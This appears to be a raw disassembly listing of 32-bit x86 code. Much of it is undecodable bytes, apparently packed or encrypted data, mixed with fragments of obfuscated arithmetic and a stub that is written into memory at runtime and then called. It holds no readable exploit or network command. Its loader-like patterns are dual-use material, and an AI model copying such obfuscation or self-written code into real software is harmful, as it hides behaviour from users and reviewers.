  40ff09:	mov    dl,BYTE PTR [ecx]
  40ff0b:	(bad)  
  40ff0c:	xor    esi,ebp
  40ff0e:	loopne 0x40ff52
  40ff10:	rcr    BYTE PTR [edi+0x66],0x7e
  40ff14:	int    0x4d
  40ff16:	sub    ch,al
  40ff18:	imul   ebx,DWORD PTR [ebx-0x7e],0xffffffef
  40ff1c:	hlt    
  40ff1d:	test   eax,0x93b53ec1
  40ff22:	lahf   
  40ff23:	cwde   
  40ff24:	mov    WORD PTR [ebx],ss
  40ff26:	sub    al,0x96
  40ff28:	jmp    0xdb4803a8
  40ff2d:	adc    BYTE PTR [edi-0xa],dh
  40ff30:	fsub   st,st(4)
  40ff32:	sahf   
  40ff33:	retf   0x48bf
  40ff36:	shr    BYTE PTR [esi],0x8d
  40ff39:	rcr    BYTE PTR ds:[eax-0x5f5d7899],0x4d
  40ff41:	add    eax,0x3901
  40ff46:	xor    eax,0x40c2
  40ff4b:	xor    edx,edx
  40ff4d:	mov    esi,0x218f6c45
  40ff52:	div    esi
  40ff54:	cmp    ecx,eax
  40ff56:	jmp    0x410224
  40ff5b:	ss int 0x1f
  40ff5e:	jnp    0x40ff7a
  40ff60:	pop    ebx
  40ff61:	xor    bl,BYTE PTR [ebp+ebx*1-0x50838c47]
  40ff68:	repz out 0xaa,eax
  40ff6b:	sbb    eax,0xbe181898
  40ff70:	adc    al,0x18
  40ff72:	sbb    BYTE PTR [ecx],ch
  40ff74:	je     0x40ffcf
  40ff76:	sub    DWORD PTR [ebp-0x56],esi
  40ff79:	call   0x7c54c305
  40ff7e:	test   al,0x34
  40ff80:	mov    al,ds:0x352bd267
  40ff85:	adc    eax,0x4bfb1a97
  40ff8a:	jnp    0x40ffc1
  40ff8c:	jae    0x40ff27
  40ff8e:	jmp    0xc06b:0xcfb2f63e
  40ff95:	fnstsw WORD PTR [edx-0x72]
  40ff98:	clc    
  40ff99:	test   eax,0xd46cde7
  40ff9e:	jne    0x410004
  40ffa0:	sub    al,0x4d
  40ffa2:	mov    cl,0x99
  40ffa4:	shl    BYTE PTR [edx+ecx*8],cl
  40ffa7:	xchg   ch,dl
  40ffa9:	mov    cl,0x86
  40ffab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffac:	mov    ch,0x2b
  40ffae:	sub    DWORD PTR [ebx+0x4a],esp
  40ffb1:	shr    bl,0x92
  40ffb4:	dec    edi
  40ffb5:	sub    ebp,edx
  40ffb7:	jmp    DWORD PTR ds:0x3a8a0feb
  40ffbd:	mov    edx,0x316dcc1e
  40ffc2:	pop    edi
  40ffc3:	push   cs
  40ffc4:	mov    ah,0x30
  40ffc6:	ret    0x1fe6
  40ffc9:	sub    ah,BYTE PTR [ecx+0x56e23119]
  40ffcf:	push   cs
  40ffd0:	das    
  40ffd1:	outs   dx,DWORD PTR ds:[esi]
  40ffd2:	jp     0x40ffc8
  40ffd4:	mov    dl,0xca
  40ffd6:	adc    edx,DWORD PTR [ebx]
  40ffd8:	and    BYTE PTR [esi-0x3d],ah
  40ffdb:	mov    bl,0x44
  40ffdd:	add    al,BYTE PTR [ebx]
  40ffdf:	mov    dh,0xba
  40ffe1:	fwait
  40ffe2:	mov    edi,0x70d845bb
  40ffe7:	add    esp,edx
  40ffe9:	xchg   ebp,eax
  40ffea:	mov    DWORD PTR [ecx+0xe],esp
  40ffed:	and    al,0xe0
  40ffef:	mov    BYTE PTR ss:[edx+ebp*1-0x24e254e5],ch
  40fff7:	cli    
  40fff8:	jecxz  0x40ffa5
  40fffa:	adc    cl,dh
  40fffc:	xchg   ebp,eax
  40fffd:	ret    0xe7d0
  410000:	rcl    BYTE PTR [ebp+0x428d737f],0xe7
  410007:	or     al,0x5f
  410009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41000a:	cmp    ah,BYTE PTR cs:[ebx+0x36]
  41000e:	cmp    DWORD PTR [edi],0xffffff93
  410011:	cs push ebp
  410013:	inc    esi
  410014:	adc    dl,cl
  410016:	or     DWORD PTR [edi+0x77f07ab5],esi
  41001c:	addr16 cdq 
  41001e:	test   eax,0x19cbd707
  410023:	or     eax,0x5bcd9fbd
  410028:	out    dx,al
  410029:	mov    cl,0x5b
  41002b:	jo     0x410054
  41002d:	jmp    0x9bf1950f
  410032:	inc    esi
  410033:	pop    DWORD PTR [ebp-0x1f22379c]
  410039:	rol    BYTE PTR [ecx-0x5f188dc5],0xcf
  410040:	jle    0x410033
  410042:	mov    ebp,0x457bad76
  410047:	mov    edi,0xbc00122e
  41004c:	xchg   edx,eax
  41004d:	scas   al,BYTE PTR es:[edi]
  41004e:	movsx  esp,dh
  410051:	push   0x67
  410053:	xor    al,0xe
  410055:	psubusw mm7,QWORD PTR [edi+0x1a]
  410059:	dec    ebp
  41005a:	inc    ebp
  41005b:	or     dl,BYTE PTR [esi]
  41005d:	ins    BYTE PTR es:[edi],dx
  41005e:	jmp    0x4100b7
  410060:	gs (bad) 
  410063:	aad    0xa
  410065:	xchg   DWORD PTR [edi+0x160609b1],eax
  41006b:	pushf  
  41006c:	loopne 0x4100a8
  41006e:	call   0x7e5d:0xa3e238c
  410075:	xor    DWORD PTR [edx],ecx
  410077:	out    0x84,eax
  410079:	mov    al,ds:0x71b9bc90
  41007e:	pop    eax
  41007f:	adc    esi,DWORD PTR [esi-0x7c]
  410082:	cmp    BYTE PTR [edx+0x5fbcf46f],dl
  410088:	loopne 0x410068
  41008a:	xor    BYTE PTR [edi+0xbab0ba8],al
  410090:	mov    edx,0xc7c32868
  410095:	ins    DWORD PTR es:[edi],dx
  410096:	arpl   WORD PTR [eax],cx
  410098:	sbb    al,0x61
  41009a:	mov    ch,0xe
  41009c:	mov    dh,0xa
  41009e:	cmc    
  41009f:	or     dh,BYTE PTR [ebx+esi*4-0x1d]
  4100a3:	cmp    al,BYTE PTR [esi-0x54feb3fb]
  4100a9:	bound  esp,QWORD PTR [ebx+0xbd56c46]
  4100af:	mov    ebx,0xf84b03bd
  4100b4:	jae    0x410106
  4100b6:	ins    DWORD PTR es:[edi],dx
  4100b7:	fild   QWORD PTR es:[ebx+0x565dbb84]
  4100be:	jl     0x41007d
  4100c0:	jb     0x4100e1
  4100c2:	enter  0xe64e,0x26
  4100c6:	call   0x1fbe:0x61e645bf
  4100cd:	aam    0x1a
  4100cf:	fsub   DWORD PTR [edx]
  4100d1:	xchg   ecx,eax
  4100d2:	mov    ds:0x2b2d8d9f,eax
  4100d7:	pop    edi
  4100d8:	pop    edi
  4100d9:	test   DWORD PTR [bp+0x25],0x7ffd4829
  4100e1:	(bad)
  4100e4:	nop
  4100e5:	loopne 0x41006c
  4100e7:	or     edx,eax
  4100e9:	adc    ah,bh
  4100eb:	pushf  
  4100ec:	push   eax
  4100ed:	push   0x2fbdec50
  4100f2:	lea    edx,[ecx+0x6a76adbd]
  4100f8:	fldcw  WORD PTR ds:0x501a34a4
  4100fe:	cmp    bh,al
  410100:	outs   dx,DWORD PTR ds:[esi]
  410101:	shr    edx,1
  410103:	and    eax,0x8bf62c85
  410108:	out    0x9c,eax
  41010a:	cmp    al,0xb1
  41010c:	push   0xffffffdb
  41010e:	shr    DWORD PTR ds:0x5c3acb9f,1
  410114:	hlt    
  410115:	push   cs
  410116:	adc    eax,0x87850b1f
  41011b:	jb     0x410154
  41011d:	pop    edx
  41011e:	xchg   ebp,eax
  41011f:	mov    BYTE PTR [edi],ah
  410121:	fcomi  st,st(1)
  410123:	in     al,0xca
  410125:	xor    al,0xaf
  410127:	push   cs
  410128:	pusha  
  410129:	pop    esi
  41012a:	mov    ds:0xbba2cb35,eax
  41012f:	cld    
  410130:	adc    al,0xcf
  410132:	popf   
  410133:	sar    esi,0xaa
  410136:	repnz arpl WORD PTR [ebx+0x46ddc26d],di
  41013d:	aam    0x7e
  41013f:	mov    edi,0x4720f4b8
  410144:	dec    edi
  410145:	ret    0xbd00
  410148:	jg     0x4101b6
  41014a:	call   0x8dc1c2cd
  41014f:	rcl    DWORD PTR [ebp+0x1e],1
  410152:	iret   
  410153:	inc    edx
  410154:	clc    
  410155:	scas   al,BYTE PTR es:[edi]
  410156:	or     cl,BYTE PTR [esi+ebx*1-0x6b]
  41015a:	ficom  WORD PTR [edx+0x6882d2a1]
  410160:	push   es
  410161:	fsubr  DWORD PTR cs:[edi-0x5c]
  410165:	cmc    
  410166:	push   edx
  410167:	call   0xee49:0xfc983758
  41016e:	push   ebp
  41016f:	out    0xb9,eax
  410171:	xor    BYTE PTR [edx+0x47],0x67
  410175:	(bad)  
  410176:	xchg   esp,eax
  410177:	pop    es
  410178:	not    DWORD PTR [ecx-0x4b0eba3e]
  41017e:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  410180:	pop    edi
  410181:	repnz mov BYTE PTR ds:0x8f391bf3,bl
  410188:	push   eax
  410189:	sub    DWORD PTR [ebx],eax
  41018b:	mov    ebp,0x5bcc0c6a
  410190:	mov    ecx,0xf796681a
  410195:	jecxz  0x4101f8
  410197:	fnsave [eax+eiz*1-0xb]
  41019b:	sti    
  41019c:	xchg   ebx,eax
  41019d:	ret    0xda6a
  4101a0:	inc    ecx
  4101a1:	pop    ebp
  4101a2:	mov    al,0x4d
  4101a4:	fadd   DWORD PTR [edx-0x7044c171]
  4101aa:	pop    ds
  4101ab:	data16 mov ch,0x2e
  4101ae:	in     al,dx
  4101af:	jno    0x4101aa
  4101b1:	pop    ebp
  4101b2:	push   es
  4101b3:	fadd   QWORD PTR [ebx]
  4101b5:	mov    al,0x91
  4101b7:	jno    0x410167
  4101b9:	jmp    0x410148
  4101bb:	lahf   
  4101bc:	not    DWORD PTR [ebp+0x71e2d9bd]
  4101c2:	rcr    DWORD PTR [edi+0x2f],0x4d
  4101c6:	je     0x41016b
  4101c8:	sar    BYTE PTR [eax],0x3
  4101cb:	les    ecx,FWORD PTR [edx]
  4101cd:	test   BYTE PTR [edi],bl
  4101cf:	out    dx,al
  4101d0:	shl    edi,0x43
  4101d3:	and    eax,0xf92c4b0c
  4101d8:	mov    al,0x2f
  4101da:	mov    dh,0x72
  4101dc:	mov    edi,esp
  4101de:	pop    ebp
  4101df:	mov    al,0xad
  4101e1:	push   ebp
  4101e2:	(bad)  
  4101e3:	in     eax,0xb
  4101e5:	ret    
  4101e6:	inc    esi
  4101e7:	popa   
  4101e8:	xor    DWORD PTR [ebx-0x3c],ebp
  4101eb:	push   edi
  4101ec:	xchg   esp,eax
  4101ed:	inc    esi
  4101ee:	inc    ebp
  4101ef:	cmp    ebx,DWORD PTR [eax+0x77]
  4101f2:	cs mov eax,0x925509a
  4101f8:	int3   
  4101f9:	or     ecx,DWORD PTR [ebp+0x7a32240d]
  4101ff:	or     eax,0x76eeabf4
  410204:	out    0x80,eax
  410206:	mov    eax,0x9052dd1
  41020b:	mov    bh,0x25
  41020d:	or     DWORD PTR [ebp-0x69],edx
  410210:	push   0xa0d69c7b
  410215:	pop    es
  410216:	int    0x79
  410218:	pop    ebp
  410219:	add    DWORD PTR [edx+0x62],esi
  41021c:	xchg   ebx,eax
  41021d:	jae    0x4101c2
  41021f:	sub    al,BYTE PTR [edi]
  410221:	icebp  
  410222:	data16 loop 0x410234
  410225:	test   DWORD PTR ds:0x8b000004,esi
  41022b:	dec    ebp
  41022c:	mov    BYTE PTR [ebx],dh
  41022e:	sar    BYTE PTR [eax+0x209c],cl
  410234:	div    ecx
  410236:	mov    ecx,DWORD PTR ds:0x4225a8
  41023c:	mov    ecx,DWORD PTR [ecx+0x1a8]
  410242:	xor    edx,edx
  410244:	sub    ecx,eax
  410246:	mov    eax,DWORD PTR [ebp-0x4c]
  410249:	xor    eax,0x3daa
  41024e:	sub    eax,0x3375
  410253:	or     eax,0x6931
  410258:	lea    eax,[ebp+eax*1-0x6c25]
  41025f:	push   eax
  410260:	mov    eax,DWORD PTR [ebp-0x8c]
  410266:	push   0x18
  410268:	pop    esi
  410269:	div    esi
  41026b:	mov    esi,DWORD PTR [ebp-0x60]
  41026e:	xor    edx,edx
  410270:	div    esi
  410272:	mov    edx,DWORD PTR [ebp-0x44]
  410275:	mov    esi,DWORD PTR [ebp-0x34]
  410278:	xor    eax,edx
  41027a:	xor    edx,edx
  41027c:	div    esi
  41027e:	imul   eax,eax,0x7d2a
  410284:	sub    eax,0x928ded7
  410289:	push   eax
  41028a:	mov    eax,ds:0x4225a8
  41028f:	add    eax,0xaa
  410294:	push   eax
  410295:	mov    eax,DWORD PTR [ebp-0x3c]
  410298:	sub    ecx,eax
  41029a:	mov    eax,DWORD PTR [ebp-0x24]
  41029d:	push   DWORD PTR [ecx+eax*1+0xbd4]
  4102a4:	call   0x41e9f9
  4102a9:	mov    DWORD PTR [ebp-0x4],eax
  4102ac:	mov    ecx,DWORD PTR ds:0x4226b0
  4102b2:	lea    eax,[ebp+0x4]
  4102b5:	mov    DWORD PTR [ecx*4+0x4226a8],eax
  4102bc:	inc    DWORD PTR ds:0x4226b0
  4102c2:	mov    eax,DWORD PTR [ebp-0x4]
  4102c5:	mov    eax,DWORD PTR [ebp-0x4]
  4102c8:	xor    edx,edx
  4102ca:	shld   edx,eax,0x2
  4102ce:	shl    eax,0x2
  4102d1:	mov    ecx,0xca79a575
  4102d6:	mov    esi,0x9c1b89e8
  4102db:	xor    eax,ecx
  4102dd:	xor    edx,esi
  4102df:	cmp    eax,ecx
  4102e1:	jne    0x4105c9
  4102e7:	cmp    edx,esi
  4102e9:	jne    0x4105c9
  4102ef:	mov    eax,0xca79a571
  4102f4:	mov    edx,esi
  4102f6:	jmp    0x410669
  4102fb:	jmp    0x4105c9
  410300:	sbb    al,0xfc
  410302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410303:	fs sbb bl,BYTE PTR es:[edx]
  410307:	mov    ebp,0x70cf8d86
  41030c:	lahf   
  41030d:	je     0x410352
  41030f:	push   0xffffffc3
  410311:	xchg   edx,eax
  410312:	sbb    BYTE PTR [eax],bl
  410314:	mov    esi,0x67181814
  410319:	ins    BYTE PTR es:[edi],dx
  41031a:	(bad)  
  41031b:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41031d:	hlt    
  41031e:	dec    edi
  41031f:	push   cs
  410320:	shl    BYTE PTR [ebp-0x60b98e56],cl
  410326:	push   edx
  410327:	pop    esp
  410328:	sub    eax,0x43dda580
  41032d:	mov    ds:0xa0fdfc8f,eax
  410332:	rcl    ch,0x2d
  410335:	sub    DWORD PTR [ebx+ebp*4-0x4242a494],ebx
  41033c:	dec    edi
  41033d:	mov    ds:0x76bbaf91,eax
  410342:	outs   dx,DWORD PTR ds:[esi]
  410343:	or     edx,DWORD PTR [edi]
  410345:	sub    DWORD PTR [edx+0x25],0x41
  410349:	rcl    DWORD PTR [ebp-0x51],cl
  41034c:	fnstenv [ebx+0x19]
  41034f:	xor    DWORD PTR [edi-0x8265f1c],ebx
  410355:	lds    ecx,FWORD PTR [ecx-0x50]
  410358:	push   ds
  410359:	out    0x25,eax
  41035b:	mov    esp,0xcb77a262
  410360:	jmp    0x764fdd79
  410365:	or     esp,DWORD PTR [eax]
  410367:	es hlt 
  410369:	mov    al,0x1a
  41036b:	cmp    al,0xf3
  41036d:	popa   
  41036e:	jne    0x41032f
  410370:	lea    eax,[ebp+edi*8-0x1f]
  410374:	xchg   edi,eax
  410375:	imul   ebp,DWORD PTR [eax+0x41],0x76
  410379:	mov    bh,0xd6
  41037b:	jo     0x41d6d350
  410381:	mov    eax,ds:0xc7a3f9d5
  410386:	jo     0x41035a
  410388:	mov    bl,0xf4
  41038a:	mov    al,dl
  41038c:	out    0x7a,eax
  41038e:	sbb    esp,edx
  410390:	test   BYTE PTR [edx+0x43],0xb8
  410394:	push   eax
  410395:	sub    al,0xb
  410397:	fnstcw WORD PTR [ebp+eax*2+0x6d6206ba]
  41039e:	cs fs aas 
  4103a1:	pushf  
  4103a2:	mov    ds:0x8c71b55a,eax
  4103a7:	gs ja  0x4103d1
  4103aa:	or     bl,BYTE PTR [esi]
  4103ac:	test   DWORD PTR [eax+0x72],ecx
  4103af:	outs   dx,DWORD PTR ds:[esi]
  4103b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103b1:	sti    
  4103b2:	push   es
  4103b3:	aaa    
  4103b4:	les    edx,FWORD PTR [eax-0x711caf83]
  4103ba:	jns    0x4103a3
  4103bc:	imul   esp,DWORD PTR [edx+edi*8],0xffffffbc
  4103c0:	sbb    BYTE PTR [ebx],dh
  4103c2:	shr    DWORD PTR [eax],0xc1
  4103c5:	in     eax,0xb1
  4103c7:	cmp    bh,ah
  4103c9:	bound  ebx,QWORD PTR [ebx+0x33b2c083]
  4103cf:	out    0x9,al
  4103d1:	push   ss
  4103d2:	or     DWORD PTR [esi-0x5e],0x5cc790b9
  4103d9:	xor    al,0x2b
  4103db:	enter  0xa3b3,0x50
  4103df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103e0:	and    BYTE PTR [ecx+0x12],cl
  4103e3:	mov    dh,0xd1
  4103e5:	or     eax,0x7783cc47
  4103ea:	inc    esi
  4103eb:	mov    DWORD PTR [eax-0x1f],ebx
  4103ee:	(bad)  
  4103ef:	sub    al,BYTE PTR [ecx-0x28]
  4103f2:	mov    edx,0x49e9d055
  4103f7:	cld    
  4103f8:	loope  0x410447
  4103fa:	mov    dh,0x84
  4103fc:	mov    edx,0xb448c2c
  410401:	je     0x410383
  410403:	add    edi,DWORD PTR [ebx]
  410405:	rcr    DWORD PTR [ebx-0x5c],0x27
  410409:	ja     0x410441
  41040b:	arpl   sp,si
  41040d:	mov    esi,0xf10f9af8
  410412:	ins    BYTE PTR es:[edi],dx
  410413:	push   esi
  410414:	fwait
  410415:	test   BYTE PTR [edi],0xa6
  410418:	inc    edi
  410419:	cmp    eax,DWORD PTR fs:[esi+0x3dd5c0be]
  410420:	add    edi,DWORD PTR [ebx]
  410422:	push   0xffffffd6
  410424:	nop
  410425:	sub    BYTE PTR [eax-0x1a],ah
  410428:	and    ebp,DWORD PTR [esi+0x4f]
  41042b:	std    
  41042c:	in     al,0x35
  41042e:	stc    
  41042f:	mov    al,cl
  410431:	jecxz  0x410440
  410433:	jecxz  0x41041e
  410435:	sub    eax,0xca7cc874
  41043a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41043b:	xchg   ebx,eax
  41043c:	push   ds
  41043d:	dec    ebx
  41043e:	popf   
  41043f:	fwait
  410440:	add    cl,BYTE PTR [ebp+0x6c489f34]
  410446:	ror    BYTE PTR ds:0x9e4af21b,cl
  41044c:	lods   al,BYTE PTR ds:[esi]
  41044d:	fadd   QWORD PTR [esi]
  41044f:	shl    cl,0x0
  410452:	inc    eax
  410453:	into   
  410454:	mov    al,BYTE PTR [eax]
  410456:	call   0xce982855
  41045b:	nop
  41045c:	and    al,0xdc
  41045e:	pop    esp
  41045f:	pusha  
  410460:	mov    eax,0xbbe4584c
  410465:	iret   
  410466:	outs   dx,BYTE PTR ds:[esi]
  410467:	jnp    0x410466
  410469:	jae    0x41042c
  41046b:	pushf  
  41046c:	add    cl,BYTE PTR [ebx]
  41046e:	sub    al,0x47
  410470:	adc    al,0xab
  410472:	jae    0x410461
  410474:	scas   al,BYTE PTR es:[edi]
  410475:	mov    edi,0xb9b09299
  41047a:	xor    al,0xeb
  41047c:	sbb    dl,BYTE PTR [ebp+0x3d]
  41047f:	outs   dx,DWORD PTR ds:[esi]
  410480:	inc    ebx
  410481:	arpl   WORD PTR [edi-0x7342aa6b],sp
  410487:	dec    ebx
  410488:	aam    0x79
  41048a:	xor    BYTE PTR [edi+0x63925e67],ah
  410490:	dec    esp
  410491:	inc    BYTE PTR [ebp-0x3da5805e]
  410497:	adc    cl,bh
  410499:	dec    ebx
  41049a:	lahf   
  41049b:	lock adc dl,0x9b
  41049f:	inc    ebx
  4104a0:	nop
  4104a1:	cwde   
  4104a2:	jbe    0x4104d9
  4104a4:	sbb    ah,BYTE PTR [edx-0x30]
  4104a7:	sbb    dh,BYTE PTR [edx]
  4104a9:	push   ds
  4104aa:	(bad)  
  4104ac:	retf   0x1be2
  4104af:	lahf   
  4104b0:	shr    BYTE PTR [ebx+eax*1-0x2d],0xf6
  4104b5:	pop    ebx
  4104b6:	bound  ebx,QWORD PTR es:[edx-0x1c]
  4104ba:	test   BYTE PTR [edi+eax*1-0x77],dl
  4104be:	rcl    BYTE PTR [ebx+0x20],1
  4104c1:	cmp    edi,DWORD PTR [eax+eiz*4+0x2a247c02]
  4104c8:	mov    edx,0x77854a3d
  4104cd:	ins    BYTE PTR es:[edi],dx
  4104ce:	cmp    DWORD PTR [ebx-0x3439b599],eax
  4104d4:	and    DWORD PTR [esp+ebp*1-0x56],ecx
  4104d8:	and    eax,0x6f88deb3
  4104dd:	sbb    al,0x47
  4104df:	push   ecx
  4104e0:	dec    edx
  4104e1:	sub    eax,0x6578109b
  4104e6:	lahf   
  4104e7:	xchg   esi,eax
  4104e8:	shl    BYTE PTR [ebx+ebp*2-0x1a23d954],cl
  4104ef:	in     al,dx
  4104f0:	and    DWORD PTR [edi],esi
  4104f2:	sbb    BYTE PTR [ecx+0x2bcc3726],al
  4104f8:	enter  0x7c53,0x4b
  4104fc:	mov    edi,0x31e6c00d
  410501:	or     ah,cl
  410503:	add    BYTE PTR [eax-0x3ec2a200],ah
  410509:	jmp    0x41057d
  41050b:	in     al,dx
  41050c:	mov    ch,0x53
  41050e:	mov    bh,0x98
  410510:	mov    ch,0x10
  410512:	ret    0x4fc1
  410515:	add    dl,BYTE PTR [ebp-0x42fadd99]
  41051b:	int3   
  41051c:	adc    DWORD PTR [edi-0x5e],eax
  41051f:	fs lahf 
  410521:	shl    DWORD PTR [edx+0x77b5d83f],1
  410527:	shl    DWORD PTR [edi],0x1c
  41052a:	pop    esp
  41052b:	fcom   DWORD PTR [ebx+0x2f]
  41052e:	nop
  41052f:	jbe    0x4104b7
  410531:	mov    ecx,0x5d624f3
  410536:	pop    ds
  410537:	and    DWORD PTR [edx+edi*4-0x79],esp
  41053b:	outs   dx,BYTE PTR ds:[esi]
  41053c:	mov    ch,BYTE PTR [ebx+0xf]
  41053f:	cli    
  410540:	add    edx,ecx
  410542:	not    BYTE PTR [edx+0x6d]
  410545:	lods   eax,DWORD PTR ds:[esi]
  410546:	xchg   ebx,eax
  410547:	ror    BYTE PTR [esi-0x5157019e],1
  41054d:	in     al,0xf6
  41054f:	ret    0xe7bd
  410552:	push   0xffffffae
  410554:	or     DWORD PTR [ecx+0x50f6cd33],edi
  41055a:	test   eax,0x80acd03b
  41055f:	int3   
  410560:	or     esi,esp
  410562:	std    
  410563:	pop    ds
  410564:	and    esi,esi
  410566:	jmp    FWORD PTR [esi+0x47]
  410569:	fmul   QWORD PTR [edi+0x700967b2]
  41056f:	test   eax,0xf9ea0db7
  410574:	inc    ebx
  410575:	iret   
  410576:	dec    esi
  410577:	rcl    BYTE PTR [edx-0x543658b9],cl
  41057d:	jp     0x410566
  41057f:	loop   0x410598
  410581:	test   BYTE PTR [eax-0x6bdb273c],cl
  410587:	test   DWORD PTR [ebp-0x6d],ecx
  41058a:	jp     0x410550
  41058c:	jae    0x410511
  41058e:	loope  0x410584
  410590:	jns    0x4105c6
  410592:	xor    esi,ecx
  410594:	mov    al,0x99
  410596:	or     edx,DWORD PTR [edx-0x4c]
  410599:	xchg   ebp,eax
  41059a:	xchg   edi,eax
  41059b:	push   0x68
  41059d:	jns    0x410566
  41059f:	add    DWORD PTR [edi],edi
  4105a1:	fnstenv [edx-0x6e]
  4105a4:	sub    al,0x2a
  4105a6:	cwde   
  4105a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105a8:	std    
  4105a9:	and    BYTE PTR [ebp+0x55],dh
  4105ac:	sahf   
  4105ad:	xchg   BYTE PTR [edx-0x18e69b6b],dl
  4105b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105b4:	push   ss
  4105b5:	mov    ebp,cs
  4105b7:	pusha  
  4105b8:	xchg   ebx,eax
  4105b9:	push   cs
  4105ba:	aad    0xfb
  4105bc:	cmp    cl,BYTE PTR [ebp-0x1a6b025a]
  4105c2:	daa    
  4105c3:	inc    ecx
  4105c4:	pop    es
  4105c5:	and    al,0xcb
  4105c7:	inc    edi
  4105c8:	sbb    cl,BYTE PTR [ebp-0x7a760fbb]
  4105ce:	fs (bad) 
  4105d0:	(bad)  
  4105d1:	dec    DWORD PTR [ebx+0x4589ac45]
  4105d7:	lock mov eax,DWORD PTR [ebp-0x10]
  4105db:	mov    ecx,DWORD PTR [ebp-0x4]
  4105de:	sub    eax,ecx
  4105e0:	mov    DWORD PTR [ebp-0x10],eax
  4105e3:	mov    eax,DWORD PTR [ebp-0x20]
  4105e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4105e9:	sub    DWORD PTR [ebp-0x10],eax
  4105ec:	mov    eax,DWORD PTR [ebp-0x4]
  4105ef:	mov    DWORD PTR [eax],0x658776e9
  4105f5:	mov    DWORD PTR [eax+0x4],0xab756547
  4105fc:	mov    eax,DWORD PTR [ebp-0x10]
  4105ff:	mov    ecx,DWORD PTR [ebp-0x4]
  410602:	mov    DWORD PTR [ecx+0x1],eax
  410605:	mov    eax,ds:0x422424
  41060a:	push   DWORD PTR [eax]
  41060c:	push   DWORD PTR ds:0x422698
  410612:	push   DWORD PTR ds:0x42242c
  410618:	push   DWORD PTR ds:0x422678
  41061e:	push   DWORD PTR ds:0x4226ec
  410624:	push   0xa4069aaa
  410629:	push   0xa4069aae
  41062e:	push   DWORD PTR [ebp-0x5c]
  410631:	mov    eax,DWORD PTR [ebp-0x4]
  410634:	call   eax
  410636:	mov    eax,DWORD PTR [edi]
  410638:	mov    eax,DWORD PTR [ebp+0x8]
  41063b:	push   DWORD PTR [eax]
  41063d:	call   0x4110ff
  410642:	mov    eax,ds:0x4225a8
  410647:	push   0x4
  410649:	add    eax,0x1dc
  41064e:	push   eax
  41064f:	push   edi
  410650:	call   0x415231
  410655:	mov    eax,0xca79a57d
  41065a:	jmp    0x4102f4
  41065f:	mov    eax,0xca79a575
  410664:	mov    edx,0x9c1b89e8
  410669:	pop    esi
  41066a:	pop    ebx
  41066b:	leave  
  41066c:	ret    0x4
  41066f:	push   ebp
  410670:	mov    ebp,esp
  410672:	sub    esp,0x20
  410675:	push   ebx
  410676:	push   edi
  410677:	mov    DWORD PTR [ebp-0x8],0x522e
  41067e:	mov    DWORD PTR [ebp-0x4],0x3dbd
  410685:	mov    DWORD PTR [ebp-0x10],0x53f1
  41068c:	mov    DWORD PTR [ebp-0xc],0x631b
  410693:	mov    DWORD PTR [ebp-0x18],0x524d
  41069a:	mov    DWORD PTR [ebp-0x14],0x1600
  4106a1:	mov    eax,DWORD PTR [ebp-0x18]
  4106a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4106a7:	mov    edx,DWORD PTR [ebp-0x10]
  4106aa:	mov    edi,DWORD PTR [ebp-0xc]
  4106ad:	push   edi
  4106ae:	push   edx
  4106af:	push   ecx
  4106b0:	push   eax
  4106b1:	call   0x416c20
  4106b6:	mov    ecx,DWORD PTR [ebp-0x8]
  4106b9:	mov    edi,DWORD PTR [ebp-0x4]
  4106bc:	add    eax,0x1dc8
  4106c1:	adc    edx,0x6fbf
  4106c7:	and    edx,edi
  4106c9:	push   0x1061
  4106ce:	and    eax,ecx
  4106d0:	or     edx,0x23ff
  4106d6:	push   0x4000022f
  4106db:	jmp    0x4109bb
  4106e0:	pop    edi
  4106e1:	jp     0x410689
  4106e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106e4:	mov    ds:0x103a5b1c,al
  4106e9:	fsub   QWORD PTR [edi-0x44]
  4106ec:	xor    BYTE PTR [ebx-0x73],0x70
  4106f0:	push   0x9a18188e
  4106f5:	adc    al,0x18
  4106f7:	sbb    dh,bl
  4106f9:	jbe    0x4106d6
  4106fb:	cs rol cl,1
  4106fe:	fs push edx
  410700:	je     0x41073c
  410702:	xchg   ecx,eax
  410703:	or     BYTE PTR [edi-0x179eb826],0x47
  41070a:	loope  0x41076e
  41070c:	addr16 (bad) 
  41070e:	and    DWORD PTR [eax],eax
  410710:	sbb    dl,ch
  410712:	lods   al,BYTE PTR ds:[esi]
  410713:	in     al,0xb4
  410715:	mov    eax,ds:0x9f2a07f
  41071a:	ss inc di
  41071d:	fadd   QWORD PTR es:[esi+0x46]
  410721:	jns    0x410719
  410723:	pop    ebx
  410724:	outs   dx,DWORD PTR ds:[esi]
  410725:	(bad)  
  410726:	sbb    bh,BYTE PTR [eax]
  410728:	fst    QWORD PTR [edx+0x3f]
  41072b:	ror    DWORD PTR [edi],cl
  41072d:	stos   BYTE PTR es:[edi],al
  41072e:	sub    eax,DWORD PTR [ecx+0x3]
  410731:	jne    0x4106f6
  410733:	jg     0x410775
  410735:	xchg   esp,eax
  410736:	dec    edi
  410737:	pop    edi
  410738:	sar    dh,1
  41073a:	dec    esp
  41073b:	imul   esi,DWORD PTR [eax+0x41],0xffffffa0
  41073f:	icebp  
  410740:	push   es
  410741:	mov    eax,0x83657cda
  410746:	jmp    0xf1f2f061
  41074b:	mov    al,ds:0x5af81ba8
  410750:	out    0x1,al
  410752:	jg     0x410766
  410754:	popa   
  410755:	or     al,0xdc
  410757:	mov    esi,0x93283250
  41075c:	sub    ch,dh
  41075e:	ins    BYTE PTR es:[edi],dx
  41075f:	push   ds
  410760:	out    0x6f,al
  410762:	in     al,0xa1
  410764:	imul   ecx,DWORD PTR [esi],0xdb488d50
  41076a:	cmp    DWORD PTR [edi],ebp
  41076c:	test   DWORD PTR [esi],esp
  41076e:	sub    al,0x85
  410770:	xchg   DWORD PTR [esp+edi*2],edx
